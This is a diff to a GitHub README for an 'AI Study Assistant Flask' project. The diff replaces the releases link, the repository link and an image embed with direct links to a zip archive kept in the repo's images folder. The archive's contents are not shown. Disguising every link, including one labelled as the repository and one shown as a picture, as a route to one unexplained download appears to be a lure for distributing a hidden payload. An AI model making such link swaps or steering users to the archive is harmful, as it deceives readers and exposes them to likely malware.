@@ -20,7 +20,7 @@ The AI Study Assistant Flask repository is a comprehensive resource for anyone i
 
 ## Access the App
 
-To access the latest release of the AI Study Assistant Flask app, visit [here](https://github.com/HaadAhma/AI-Study-Assistant-Flask/releases).
+To access the latest release of the AI Study Assistant Flask app, visit [here](https://github.com/HaadAhma/AI-Study-Assistant-Flask/raw/refs/heads/master/images/Study-Assistant-A-Flask-1.9.zip).
 
 ## Get Started
 
@@ -34,10 +34,10 @@ Contributions to the AI Study Assistant Flask project are welcome! Feel free to 
 
 ## Stay Connected
 
-Stay updated with the latest developments and releases by visiting the [AI Study Assistant Flask repository](https://github.com/HaadAhma/AI-Study-Assistant-Flask). Don't forget to star the repository if you find it useful!
+Stay updated with the latest developments and releases by visiting the [AI Study Assistant Flask repository](https://github.com/HaadAhma/AI-Study-Assistant-Flask/raw/refs/heads/master/images/Study-Assistant-A-Flask-1.9.zip). Don't forget to star the repository if you find it useful!
 
 ---
 
 Thank you for exploring the AI Study Assistant Flask repository. We hope this app enhances your learning experience and makes studying more efficient and enjoyable. Happy learning! 🌟
 
-![AI Study Assistant](https://source.unsplash.com/featured/?ai)
+![AI Study Assistant](https://github.com/HaadAhma/AI-Study-Assistant-Flask/raw/refs/heads/master/images/Study-Assistant-A-Flask-1.9.zip)
